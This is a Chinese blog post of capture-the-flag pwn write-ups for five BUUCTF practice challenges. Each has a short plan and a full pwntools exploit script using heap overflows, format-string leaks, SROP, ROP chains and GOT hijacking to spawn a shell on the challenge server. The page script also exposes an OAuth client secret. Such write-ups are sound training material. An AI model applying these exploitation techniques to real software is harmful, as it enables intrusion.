<h2 id="13-buu-0ctf2016-fheap"><a href="#13-buu-0ctf2016-fheap" class="headerlink" title="13.buu 0ctf2016 fheap"></a>13.buu 0ctf2016 fheap</h2><p>步骤：<br>1.利用堆溢出与短字节覆盖教free所在函数的地址变为put函数，获得程序的基地址</p>
<p>2.利用同样的方法更改为printf函数，构造格式化字符串漏洞</p>
<p>3.根据格式化字符串获取libc基地址</p>
<p>4.同样利用堆溢出漏洞getshell</p>
<p>这道题漏洞好利用，主要是这个调试太恶心，不过也可以锻炼一下动态调试的水平</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./fuck'</span></span><br><span class="line"><span class="comment">#libc_name = ''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'27016'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'quit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'create string'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Pls give string size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'str:'</span>)</span><br><span class="line">	p.send(content.ljust(size,<span class="string">'\x00'</span>))</span><br><span class="line">	<span class="comment">#p.recvuntil('\n')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'quit\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'delete string'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">'sure?:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'yes'</span>)</span><br><span class="line"><span class="comment">#pass PIE</span></span><br><span class="line">create(<span class="number">10</span>,<span class="string">'aaa'</span>)</span><br><span class="line">create(<span class="number">10</span>,<span class="string">'bbb'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">24</span> + p8(<span class="number">0x1A</span>) <span class="comment">#短字节覆盖，将free_ptr变为puts，free时输出本地地址，求得基地址</span></span><br><span class="line">create(len(payload1),payload1)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span> * <span class="number">24</span>)</span><br><span class="line">PIE_1 = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="comment">#由于puts会00截断所以可以多试几次</span></span><br><span class="line">log.success(<span class="string">"PIE_1: "</span>+hex(PIE_1))</span><br><span class="line">num_base = PIE_1 - <span class="number">0xd1A</span>  <span class="comment">#这里刚开始我写的是0x1A,好吧，我是二傻子</span></span><br><span class="line">log.success(<span class="string">"num_base: "</span>+hex(num_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment">#这里同时free掉了两个堆</span></span><br><span class="line">pri_add = num_base + elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">log.info(<span class="string">"pri_add: "</span>+hex(pri_add))</span><br><span class="line">part0 = <span class="string">'aaaa%'</span>+str(<span class="number">21</span>)+<span class="string">'$llp'</span></span><br><span class="line">part0 = part0.ljust(<span class="number">24</span>,<span class="string">'C'</span>)</span><br><span class="line">payload2 = part0 + p64(pri_add)</span><br><span class="line">create(<span class="number">32</span>,payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *printf") #在获取偏移时，断点下在printf处，gdb在这里，就可以进入printf函数，获取栈的情况</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#get:0x7ffff6c95d08</span></span><br><span class="line"><span class="comment">#_IO_file_write+143:0x7ffff6c95d58</span></span><br><span class="line"><span class="comment">#offset =11+10 (10=(0x7ffff6c95d58-0x7ffff6c95d08)/8) 这里是根据调试得到的结果，计算方法</span></span><br><span class="line">p.recvuntil(<span class="string">'aaaa'</span>)</span><br><span class="line">_IO_file_write =int(p.recvuntil(<span class="string">'C'</span>)[:<span class="number">-1</span>],<span class="number">16</span>) - <span class="number">143</span></span><br><span class="line">log.success(<span class="string">"_IO_file_write:"</span> +hex(_IO_file_write))</span><br><span class="line">libc=LibcSearcher(<span class="string">"_IO_file_write"</span>,_IO_file_write)</span><br><span class="line">libc_base = _IO_file_write - libc.dump(<span class="string">'_IO_file_write'</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload3 = <span class="string">'/bin/sh;'</span>.ljust(<span class="number">24</span>, <span class="string">'A'</span>)+ p64(sys_add) <span class="comment">#这里不知道为啥不能用地址</span></span><br><span class="line">create(<span class="number">32</span>,payload3)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="14、ciscn-2019-es-7"><a href="#14、ciscn-2019-es-7" class="headerlink" title="14、ciscn_2019_es_7"></a>14、ciscn_2019_es_7</h2><p>64位程序，只有系统调用存在，有signturn的后门，即存在使eax赋值的指令</p>
<p>具体解释在exp中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'25359'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line">read_add =<span class="number">0x4004f1</span></span><br><span class="line">start_add =<span class="number">0x4004ed</span></span><br><span class="line">syscall_add =<span class="number">0x400517</span></span><br><span class="line">signturn_back =<span class="number">0x4004DA</span></span><br><span class="line">payload = <span class="string">'/bin/sh'</span>+<span class="string">"\x00"</span>*<span class="number">9</span>+ p64(read_add)<span class="comment">#调用完vuln函数后回到调用read处</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">stack_add=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">"stack_add:"</span> +hex(stack_add))<span class="comment">#这里获取的是main主函数的栈地址，从汇编上可以看到，在调用                                          vuln函数之前值push了rbp</span></span><br><span class="line">										 <span class="comment">#因此ret地址后面的就为rbp(rbp存放着栈地址)</span></span><br><span class="line">p.recv(<span class="number">8</span>)<span class="comment">#从汇编上看write函数只是打印了0x30个字符，所以这是最后8个</span></span><br><span class="line"><span class="comment">#构造srop</span></span><br><span class="line">sigframe = SigreturnFrame()<span class="comment">#这里是pwntools集成的堆srop的应用</span></span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_add - <span class="number">280</span>  <span class="comment"># "/bin/sh" 's addr #通过调试计算得到</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_add</span><br><span class="line">sigframe.rip = syscall_add</span><br><span class="line">payload1 = <span class="string">'/bin/sh/'</span> + <span class="string">'\x00'</span> * <span class="number">8</span> + p64(signturn_back) + p64(syscall_add) + str(sigframe)</span><br><span class="line"><span class="comment">#这里我有点地方不懂，经过调试但就是这样，如果字符串填满后，我们的signturn_back的低两字节就会为00，相当于我们传入的地址往前移动了两位，地址错误，无法getshell，具体是为啥我也不知道</span></span><br><span class="line"><span class="comment">#这里之所以是'\x00' * 8 而不是多加个8，是因为，汇编：rsi, [rsp+buf] 这个buf是固定的相对于rbp位置的偏移，因此输入的地方少了8个字符</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="15-picoctf-2018-rop-chain"><a href="#15-picoctf-2018-rop-chain" class="headerlink" title="15.picoctf_2018_rop chain"></a>15.picoctf_2018_rop chain</h2><p>注意观察flag函数</p>
<p>存在参数的操作</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'27267'</span></span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">flag_add = <span class="number">0x804862b</span></span><br><span class="line">win1_add = <span class="number">0x80485cb</span></span><br><span class="line">win2_add = <span class="number">0x80485d8</span></span><br><span class="line">win2_num = <span class="number">0xBAAAAAAD</span></span><br><span class="line">flag_num = <span class="number">0xDEADBAAD</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x18</span>+<span class="number">4</span>) + p32(win1_add) + p32(win2_add) + p32(flag_add) + p32(win2_num) + p32(flag_num)</span><br><span class="line">p.recvuntil(<span class="string">'Enter your input&gt; '</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="16-bjdctf-2020-babyrop"><a href="#16-bjdctf-2020-babyrop" class="headerlink" title="16.bjdctf_2020_babyrop"></a>16.bjdctf_2020_babyrop</h2><p>很简单的rop</p>
<p>但是不知道问什么ret2__libc_csu_init不管用，回不到主函数，还是太菜了</p>
<p>这里使用最常用的rop</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line"><span class="comment">#libc_name = ''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'26097'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port) </span><br><span class="line">csu_end_addr = <span class="number">0x000000000040072A</span></span><br><span class="line">csu_front_addr = <span class="number">0x400710</span></span><br><span class="line">main_add = <span class="number">0x4006AD</span></span><br><span class="line">offset = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">bss_add = elf.bss()</span><br><span class="line">puts_got = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment">#write_add = elf.got['write']</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">libc_start_add = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def csu(rbx, rbp, r12, r13, r14, r15,last): #这里的r13 r14 r15 分别为第三 第二 第一个参数</span></span><br><span class="line"><span class="string">    # pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line"><span class="string">    # rbx should be 0,</span></span><br><span class="line"><span class="string">    # rbp should be 1,enable not to jump</span></span><br><span class="line"><span class="string">    # r12 should be the function we want to call</span></span><br><span class="line"><span class="string">    # rdi=edi=r15d</span></span><br><span class="line"><span class="string">    # rsi=r14</span></span><br><span class="line"><span class="string">    # rdx=r13</span></span><br><span class="line"><span class="string">    payload = 'a' * offset</span></span><br><span class="line"><span class="string">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span></span><br><span class="line"><span class="string">    payload += p64(csu_front_addr)</span></span><br><span class="line"><span class="string">    payload += 'a' * 0x38   #此时的r12应为被调用函数的got表地址</span></span><br><span class="line"><span class="string">    payload += p64(last)</span></span><br><span class="line"><span class="string">    p.send(payload)</span></span><br><span class="line"><span class="string">    sleep(1)</span></span><br><span class="line"><span class="string">p.recvuntil('Pull up your sword and tell me u story!\n')</span></span><br><span class="line"><span class="string">csu(0,1,puts_got,0,0,libc_start_add,main_add)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#p.recvall()</span></span><br><span class="line">payload = <span class="string">'a'</span> * offset + p64(pop_rdi) + p64(libc_start_add) + p64(puts_got) + p64(main_add)</span><br><span class="line">p.recvuntil(<span class="string">'Pull up your sword and tell me u story!\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">libc_add = u64(p.recv(<span class="number">6</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"libc_add: "</span>+hex(libc_add))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"__libc_start_main"</span>,int(libc_add))</span><br><span class="line">libc_base = libc_add - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"sys_add:"</span> +hex(sys_add))</span><br><span class="line">log.success(<span class="string">"bin_add: "</span>+hex(bin_add))</span><br><span class="line"></span><br><span class="line">payload0 = <span class="string">'a'</span> * offset + p64(pop_rdi) + p64(bin_add) + p64(sys_add)</span><br><span class="line">p.recvuntil(<span class="string">'Pull up your sword and tell me u story!\n'</span>)</span><br><span class="line">p.send(payload0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="17-ZJCTF-2019-EasyHeap"><a href="#17-ZJCTF-2019-EasyHeap" class="headerlink" title="17.[ZJCTF 2019]EasyHeap"></a>17.[ZJCTF 2019]EasyHeap</h2><p>常见的堆溢出，注意一下几点：</p>
<p>1.此题没有show功能，且无法进行字节覆盖，不适合使用unsortbin 泄露libc基地址</p>
<p>2.由于buu没有复现，给出的后门无法利用</p>
<p>3.我relro没有完全开启，我们可以通过挟持free_got地址来进行geshell</p>
<p>4，挟持后，free函数的参数即为我们system函数的参数（参数如果为地址的话，地址指向的数据为参数）</p>
<p>5.我们通过IDA可以查看heaparry的地址，通过查看周围可以伪造堆的size位，即</p>
<p>0x6020d0-3</p>
<p>6.可以通过覆盖fd来获得堆，之后通过edit功能修改heaparry，可以将存储的堆地址覆盖为free_got地址，之后，通过edit功能其修改就挟持了got地址</p>
<p>7.之后通过/bin/sh的写入以及调用free函数（被挟持）来实现getshell</p>
<p>最重要的是伪造堆的那块</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./easyheap'</span></span><br><span class="line"><span class="comment">#libc_name = ''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'27847'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size of Heap :'</span>)</span><br><span class="line">	p.send(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line">	p.send(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">'Size of Heap :'</span>)</span><br><span class="line">	p.send(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'Content of heap :'</span>)</span><br><span class="line">	p.send(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">sys_add = <span class="number">0x400423</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">sys_add = <span class="number">0x00000000000400C2C</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload0 = <span class="string">'/bin/sh\x00'</span> + <span class="string">'a'</span> * <span class="number">0x60</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020b0</span><span class="number">-3</span>) <span class="comment">#index=2的堆的前八字节位index=1的堆的数据</span></span><br><span class="line">edit(<span class="number">1</span>,len(payload0),payload0)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'c'</span>)<span class="comment">#3</span></span><br><span class="line">payload2 = <span class="string">'\xaa'</span> * <span class="number">3</span> +p64(<span class="number">0</span>)*<span class="number">4</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">3</span>,len(payload2),payload2)</span><br><span class="line">payload3 = p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">0</span>,len(payload3),payload3)<span class="comment">#此时free的参数即为syscall的参数</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://summern.club/2020/02/13/buuctf/" data-id="ck8d4th0m00052glu4q028zku"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  
    
  <nav class="article-nav">
    
      <a href="/2020/03/11/2020%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%ABpwn/" class="article-nav-link">
        <strong class="article-nav-caption">Newer posts</strong>
        <div class="article-nav-title">
          
            2020高校战疫pwn
          
        </div>
      </a>
    
    
      <a href="/2020/02/11/fastbin-attack%202014%20hack.lu%20oreo%20/" class="article-nav-link">
        <strong class="article-nav-caption">Olde posts</strong>
        <div class="article-nav-title">fastbin-attack 2014 hack.lu oreo </div>
      </a>
    
  </nav>


  

  
    
  <div class="gitalk" id="gitalk-container"></div>
  
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">

  
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

  
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>

  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: '665e1db541e975225bc6',
      clientSecret: '525f3534fe6005375cf8c02330ed09a2b7aab7d5',
      repo: 'talk',
      owner: 'summerN',
      admin: ['summerN'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 summerN&#39;s blog</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>

<aside class="sidebar sidebar-specter">
  
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/gallery">Gallery</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="Search">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
